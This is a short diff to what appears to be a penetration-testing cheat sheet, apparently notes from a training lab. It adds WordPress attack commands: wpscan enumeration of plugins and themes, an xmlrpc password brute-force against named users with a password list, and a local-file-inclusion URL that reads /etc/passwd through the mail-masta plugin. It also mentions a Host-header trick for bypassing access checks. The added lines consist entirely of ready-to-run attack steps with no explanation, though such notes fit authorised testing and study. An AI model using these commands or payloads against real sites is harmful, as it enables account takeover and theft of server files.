@@ -229,6 +229,12 @@ to pypass host unauthorized >> Host: localhost
 ---------------------------------------------------------------------------------------------------------
 				WORDPRESS
 				FUZZ 404
+gem install ruby-devel wpscan
+wpscan –url http://IP/ –enumerate p -e vt,vp
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
+WORDPRESS LFI
+http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+
 wp-admin.php   
 wp-config.php
 wp-content/uploads
